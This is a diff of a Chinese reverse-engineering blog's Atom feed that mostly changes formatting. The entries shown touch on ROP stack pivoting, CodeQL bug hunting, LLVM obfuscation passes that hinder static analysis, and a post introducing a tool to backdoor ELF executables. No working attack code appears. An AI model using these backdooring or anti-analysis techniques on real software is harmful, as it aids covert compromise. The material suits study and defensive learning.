 &lt;p&gt;如果需要栈迁移，则需要使用两次 &lt;code&gt;leave&lt;&#x2F;code&gt; 指令来修改 SP 和 BP，将栈迁移到可以控制的地方，从而实现执行 ROP 链。&lt;&#x2F;p&gt;
 &lt;p&gt;当然利用方式还是得根据具体题目进行改变，所以请君自行补充。&lt;&#x2F;p&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>CodeQL 体验</title>
-		<published>2020-04-20T00:00:00+00:00</published>
-		<updated>2020-04-20T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/codeql/" type="text/html"/>
-		<id>https://chenx6.github.io/post/codeql/</id>
-		<content type="html">&lt;h2 id=&quot;概要&quot;&gt;概要&lt;&#x2F;h2&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>CodeQL 体验</title>
+        <published>2020-04-20T00:00:00+00:00</published>
+        <updated>2020-04-20T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/codeql/" type="text/html"/>
+        <id>https://chenx6.github.io/post/codeql/</id>
+        
+        <content type="html">&lt;h2 id=&quot;概要&quot;&gt;概要&lt;&#x2F;h2&gt;
 &lt;p&gt;之前在 Twitter 上看到有大佬说 Github Learning Club 上搞了个免费的 CodeQL 课程，课程最终目标是使用 CodeQL 这个语言找出 uboot 中的 9 个漏洞。我在克服拖延症后，终于在 4 月底完成了这个课程，于是写文记录。&lt;&#x2F;p&gt;
 &lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;lab.github.com&#x2F;githubtraining&#x2F;codeql-u-boot-challenge-(cc++)&quot;&gt;课程链接&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 &lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;securitylab.github.com&#x2F;research&#x2F;uboot-rce-nfs-vulnerability&quot;&gt;通过 CodeQL 找出来的漏洞分析&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
@@ -3156,14 +3302,19 @@ select sink, source, sink, &amp;quot;Network byte swap flows to memcpy&amp;quot;
 &lt;h2 id=&quot;refs&quot;&gt;refs&lt;&#x2F;h2&gt;
 &lt;p&gt;CodeQL 教程 &lt;a href=&quot;https:&#x2F;&#x2F;help.semmle.com&#x2F;QL&#x2F;learn-ql&#x2F;&quot;&gt;https:&#x2F;&#x2F;help.semmle.com&#x2F;QL&#x2F;learn-ql&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>斐讯 N1 折腾&#x2F;避坑笔记</title>
-		<published>2020-02-01T00:00:00+00:00</published>
-		<updated>2020-02-01T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/n1_modify/" type="text/html"/>
-		<id>https://chenx6.github.io/post/n1_modify/</id>
-		<content type="html">&lt;p&gt;最近想搞一台小服务器来做 Git 服务器，下载 Bt 等事情，所以就在一堆便宜的 ARM 机顶盒&#x2F;NAS 中间挑选。最后看上了 100 RMB 左右的斐讯 N1，因为 N1 不用拆机就可以刷机。&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>斐讯 N1 折腾&#x2F;避坑笔记</title>
+        <published>2020-02-01T00:00:00+00:00</published>
+        <updated>2020-02-01T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/n1_modify/" type="text/html"/>
+        <id>https://chenx6.github.io/post/n1_modify/</id>
+        
+        <content type="html">&lt;p&gt;最近想搞一台小服务器来做 Git 服务器，下载 Bt 等事情，所以就在一堆便宜的 ARM 机顶盒&#x2F;NAS 中间挑选。最后看上了 100 RMB 左右的斐讯 N1，因为 N1 不用拆机就可以刷机。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;准备工作&quot;&gt;准备工作&lt;&#x2F;h2&gt;
 &lt;ul&gt;
 &lt;li&gt;空 U 盘&lt;&#x2F;li&gt;
@@ -3219,14 +3370,19 @@ select sink, source, sink, &amp;quot;Network byte swap flows to memcpy&amp;quot;
 &lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;Annotation_2020-03-02_151817.png&quot; alt=&quot;6&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
 &lt;p&gt;这个 service 会随着用户的退出而退出，所以要将当前用户设置为驻留用户：&lt;code&gt;loginctl enable-linger $USER&lt;&#x2F;code&gt;，这样就能实现开机启动，用户登出时不退出服务了。&lt;&#x2F;p&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>LC3-VM 学习和实现</title>
-		<published>2020-01-15T00:00:00+00:00</published>
-		<updated>2020-01-15T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/lc3-vm/" type="text/html"/>
-		<id>https://chenx6.github.io/post/lc3-vm/</id>
-		<content type="html">&lt;p&gt;本文是根据 &lt;a href=&quot;https:&#x2F;&#x2F;justinmeiners.github.io&#x2F;lc3-vm&quot;&gt;https:&#x2F;&#x2F;justinmeiners.github.io&#x2F;lc3-vm&lt;&#x2F;a&gt; 和 &lt;a href=&quot;https:&#x2F;&#x2F;justinmeiners.github.io&#x2F;lc3-vm&#x2F;supplies&#x2F;lc3-isa.pdf&quot;&gt;https:&#x2F;&#x2F;justinmeiners.github.io&#x2F;lc3-vm&#x2F;supplies&#x2F;lc3-isa.pdf&lt;&#x2F;a&gt; ISA 写出 LC3 VM 的实现过程。&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>LC3-VM 学习和实现</title>
+        <published>2020-01-15T00:00:00+00:00</published>
+        <updated>2020-01-15T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/lc3-vm/" type="text/html"/>
+        <id>https://chenx6.github.io/post/lc3-vm/</id>
+        
+        <content type="html">&lt;p&gt;本文是根据 &lt;a href=&quot;https:&#x2F;&#x2F;justinmeiners.github.io&#x2F;lc3-vm&quot;&gt;https:&#x2F;&#x2F;justinmeiners.github.io&#x2F;lc3-vm&lt;&#x2F;a&gt; 和 &lt;a href=&quot;https:&#x2F;&#x2F;justinmeiners.github.io&#x2F;lc3-vm&#x2F;supplies&#x2F;lc3-isa.pdf&quot;&gt;https:&#x2F;&#x2F;justinmeiners.github.io&#x2F;lc3-vm&#x2F;supplies&#x2F;lc3-isa.pdf&lt;&#x2F;a&gt; ISA 写出 LC3 VM 的实现过程。&lt;&#x2F;p&gt;
 &lt;p&gt;代码已上传到了 Github 上：&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;lc3-vm&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;lc3-vm&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;LC3_架构&quot;&gt;LC3 架构&lt;&#x2F;h2&gt;
 &lt;h3 id=&quot;内存&quot;&gt;内存&lt;&#x2F;h3&gt;
@@ -3658,14 +3814,19 @@ ADD DR&lt;span class=&quot;z-punctuation z-separator z-c&quot;&gt;,&lt;&#x2F;spa
 这个 C 实现的虚拟机封装比较完整 &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;rpendleton&#x2F;lc3sim-c&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;rpendleton&#x2F;lc3sim-c&lt;&#x2F;a&gt;
 这个实现里加了测试样例 &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;viking&#x2F;lc3-vm&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;viking&#x2F;lc3-vm&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>在 LLVM 代码树外编译 LLVM Pass (使用 OLLVM 示范)</title>
-		<published>2020-01-01T00:00:00+00:00</published>
-		<updated>2020-01-01T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/build_pass_out_of_tree/" type="text/html"/>
-		<id>https://chenx6.github.io/post/build_pass_out_of_tree/</id>
-		<content type="html">&lt;p&gt;在网络上流传的编译 LLVM Pass 都需要一份 LLVM 源码，从整个源代码编译，编译非常花时间 (i7 6700HQ 使用 &lt;code&gt;make -j8&lt;&#x2F;code&gt; 编译整个项目花了近 50 分钟)，所以在翻阅文档时发现 LLVM 支持在代码树外编译，在 1 分钟内编译一个 Pass，还是非常香的。&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>在 LLVM 代码树外编译 LLVM Pass (使用 OLLVM 示范)</title>
+        <published>2020-01-01T00:00:00+00:00</published>
+        <updated>2020-01-01T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/build_pass_out_of_tree/" type="text/html"/>
+        <id>https://chenx6.github.io/post/build_pass_out_of_tree/</id>
+        
+        <content type="html">&lt;p&gt;在网络上流传的编译 LLVM Pass 都需要一份 LLVM 源码，从整个源代码编译，编译非常花时间 (i7 6700HQ 使用 &lt;code&gt;make -j8&lt;&#x2F;code&gt; 编译整个项目花了近 50 分钟)，所以在翻阅文档时发现 LLVM 支持在代码树外编译，在 1 分钟内编译一个 Pass，还是非常香的。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;项目配置&quot;&gt;项目配置&lt;&#x2F;h2&gt;
 &lt;h3 id=&quot;项目目录结构&quot;&gt;项目目录结构&lt;&#x2F;h3&gt;
 &lt;p&gt;本次作为示范的 OLLVM 是一个使用 LLVM Pass 进行代码混淆的项目。他的主要文件在于 &lt;code&gt;${LLVM 项目目录}&#x2F;lib&#x2F;Transforms&#x2F;Obfuscation&#x2F;&lt;&#x2F;code&gt; 和 &lt;code&gt;${LLVM 项目目录}&#x2F;include&#x2F;llvm&#x2F;Transforms&#x2F;Obfuscation&#x2F;&lt;&#x2F;code&gt;。将这两个目录下的文件放入对应的目录就可以在代码树外编译 OLLVM 了。OLLVM 相关的文件可以在 &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;obfuscator-llvm&#x2F;&#x2F;obfuscator&#x2F;tree&#x2F;llvm-4.0&quot;&gt;GitHub&lt;&#x2F;a&gt; 找到。&lt;&#x2F;p&gt;
@@ -3966,14 +4127,19 @@ _UNKNOWN unk_400F24&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;
 &lt;p&gt;LLVM 官方关于 CMake 构建项目的文档：&lt;a href=&quot;http:&#x2F;&#x2F;releases.llvm.org&#x2F;9.0.0&#x2F;docs&#x2F;CMake.html#developing-llvm-passes-out-of-source&quot;&gt;http:&#x2F;&#x2F;releases.llvm.org&#x2F;9.0.0&#x2F;docs&#x2F;CMake.html#developing-llvm-passes-out-of-source&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 &lt;p&gt;一个 LLVM Pass 骨架：&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;sampsyo&#x2F;llvm-pass-skeleton&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;sampsyo&#x2F;llvm-pass-skeleton&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>给 ELF 文件加上后门</title>
-		<published>2020-01-01T00:00:00+00:00</published>
-		<updated>2020-01-01T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/elf_backdoor/" type="text/html"/>
-		<id>https://chenx6.github.io/post/elf_backdoor/</id>
-		<content type="html">&lt;p&gt;在渗透测试中，给常用的可执行文件加上后门是很常见的操作。但是之前的加后门 &amp;quot;The backdoor factory&amp;quot; 已经不维护了，而且还是 Python2 写的，代码质量也...所以我自己尝试着重新用 Python3 造了个轮子。在造轮子的过程中，由于 APUE 扔在学校里面了，导致在写和系统相关的汇编时出现了一些翻车情况...&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>给 ELF 文件加上后门</title>
+        <published>2020-01-01T00:00:00+00:00</published>
+        <updated>2020-01-01T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/elf_backdoor/" type="text/html"/>
+        <id>https://chenx6.github.io/post/elf_backdoor/</id>
+        
+        <content type="html">&lt;p&gt;在渗透测试中，给常用的可执行文件加上后门是很常见的操作。但是之前的加后门 &amp;quot;The backdoor factory&amp;quot; 已经不维护了，而且还是 Python2 写的，代码质量也...所以我自己尝试着重新用 Python3 造了个轮子。在造轮子的过程中，由于 APUE 扔在学校里面了，导致在写和系统相关的汇编时出现了一些翻车情况...&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;加后门的流程&quot;&gt;加后门的流程&lt;&#x2F;h2&gt;
 &lt;p&gt;基本分为两部分，先分析 ELF，然后根据之前的分析来给 ELF 加个&amp;quot;补丁&amp;quot;。&lt;&#x2F;p&gt;
 &lt;ol&gt;
@@ -4226,14 +4392,19 @@ _UNKNOWN unk_400F24&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;
 &lt;p&gt;UCLib 关于 ELF 格式的文档&lt;a href=&quot;https:&#x2F;&#x2F;uclibc.org&#x2F;docs&#x2F;elf-64-gen.pdf&quot;&gt;https:&#x2F;&#x2F;uclibc.org&#x2F;docs&#x2F;elf-64-gen.pdf&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 &lt;p&gt;看不进去英文可以配合 CSDN 这篇文章 &lt;a href=&quot;https:&#x2F;&#x2F;blog.csdn.net&#x2F;feglass&#x2F;article&#x2F;details&#x2F;51469511&quot;&gt;https:&#x2F;&#x2F;blog.csdn.net&#x2F;feglass&#x2F;article&#x2F;details&#x2F;51469511&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>使用 LLVM Pass 实现字符串加密</title>
-		<published>2020-01-01T00:00:00+00:00</published>
-		<updated>2020-01-01T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/obfuscate_string/" type="text/html"/>
-		<id>https://chenx6.github.io/post/obfuscate_string/</id>
-		<content type="html">&lt;p&gt;这个项目可以作为我看了这么久 LLVM 的 Docs 助眠的一个小总结吧。这个项目主要就是给函数使用的常量字符串进行加密，在程序被静态分析的时候干扰分析。当然找到思路后，这个混淆还是很容易解开的。&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>使用 LLVM Pass 实现字符串加密</title>
+        <published>2020-01-01T00:00:00+00:00</published>
+        <updated>2020-01-01T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/obfuscate_string/" type="text/html"/>
+        <id>https://chenx6.github.io/post/obfuscate_string/</id>
+        
+        <content type="html">&lt;p&gt;这个项目可以作为我看了这么久 LLVM 的 Docs 助眠的一个小总结吧。这个项目主要就是给函数使用的常量字符串进行加密，在程序被静态分析的时候干扰分析。当然找到思路后，这个混淆还是很容易解开的。&lt;&#x2F;p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;吐槽下，网上的文章质量参差不齐，写的让人不知所云的，真的恐怖。所以还是面向 Stackoverflow 和官方文档编程吧...&lt;&#x2F;p&gt;
 &lt;&#x2F;blockquote&gt;
@@ -4651,14 +4822,19 @@ define dso_local i32 @main() #0 {
 &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-end z-c&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
 &lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>重写 OLLVM 之虚假控制流</title>
-		<published>2020-01-01T00:00:00+00:00</published>
-		<updated>2020-01-01T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/post/rewrite_ollvm_bcf/" type="text/html"/>
-		<id>https://chenx6.github.io/post/rewrite_ollvm_bcf/</id>
-		<content type="html">&lt;p&gt;由于我个人觉得 OLLVM 的代码年久失修，所以就新建了个项目，开始学习并重写 OLLVM。项目地址：&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;baby_obfuscator&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;baby_obfuscator&lt;&#x2F;a&gt;。如果将我的重写项目和 OLLVM 相比的话，我的项目的优点就是编译比较快（编译整个项目只需要不到 1 分钟），代码比较“新”吧...&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>重写 OLLVM 之虚假控制流</title>
+        <published>2020-01-01T00:00:00+00:00</published>
+        <updated>2020-01-01T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/post/rewrite_ollvm_bcf/" type="text/html"/>
+        <id>https://chenx6.github.io/post/rewrite_ollvm_bcf/</id>
+        
+        <content type="html">&lt;p&gt;由于我个人觉得 OLLVM 的代码年久失修，所以就新建了个项目，开始学习并重写 OLLVM。项目地址：&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;baby_obfuscator&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;baby_obfuscator&lt;&#x2F;a&gt;。如果将我的重写项目和 OLLVM 相比的话，我的项目的优点就是编译比较快（编译整个项目只需要不到 1 分钟），代码比较“新”吧...&lt;&#x2F;p&gt;
 &lt;p&gt;下面讲讲我个人重写虚假控制流的思路，以及对其他项目中相同功能的理解。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;什么是虚假控制流_(Bogus_control_flow)&quot;&gt;什么是虚假控制流 (Bogus control flow)&lt;&#x2F;h2&gt;
 &lt;p&gt;在讲解虚假控制流时，我们先解释一些名词，然后看下流程表示就可以知道大概了。&lt;&#x2F;p&gt;
@@ -4953,14 +5129,19 @@ define dso_local i32 @main() #0 {
 &lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;HikariObfuscator&#x2F;Core&quot;&gt;HikariObfuscator&#x2F;Core&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 &lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;obfuscator-llvm&#x2F;obfuscator&quot;&gt;obfuscator-llvm&#x2F;obfuscator&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 </content>
-	</entry>
-	<entry xml:lang="zh_CN">
-		<title>about</title>
-		<published>2000-01-01T00:00:00+00:00</published>
-		<updated>2000-01-01T00:00:00+00:00</updated>
-		<link rel="alternate" href="https://chenx6.github.io/about/" type="text/html"/>
-		<id>https://chenx6.github.io/about/</id>
-		<content type="html">&lt;p&gt;这是一个介绍页面，但是我不知道该写什么…&lt;&#x2F;p&gt;
+        
+    </entry>
+    <entry xml:lang="zh_CN">
+        <title>about</title>
+        <published>2000-01-01T00:00:00+00:00</published>
+        <updated>2000-01-01T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://chenx6.github.io/about/" type="text/html"/>
+        <id>https://chenx6.github.io/about/</id>
+        
+        <content type="html">&lt;p&gt;这是一个介绍页面，但是我不知道该写什么…&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;个人介绍&quot;&gt;个人介绍&lt;&#x2F;h2&gt;
 &lt;ul&gt;
 &lt;li&gt;对软件逆向工程感兴趣&lt;&#x2F;li&gt;
@@ -4971,5 +5152,6 @@ define dso_local i32 @main() #0 {
 &lt;h2 id=&quot;本站为_wumaoland_组织的一员&quot;&gt;本站为 wumaoland 组织的一员&lt;&#x2F;h2&gt;
 &lt;p&gt;本站很荣幸成为 wumaoland 组织的一员，感谢轮子邪教和没有🐴的三西猴能为鄙人授予这么崇高的荣誉！希望三西猴早日能体验到共产主义铁拳的温暖。&lt;&#x2F;p&gt;
 </content>
-	</entry>
+        
+    </entry>
 </feed>
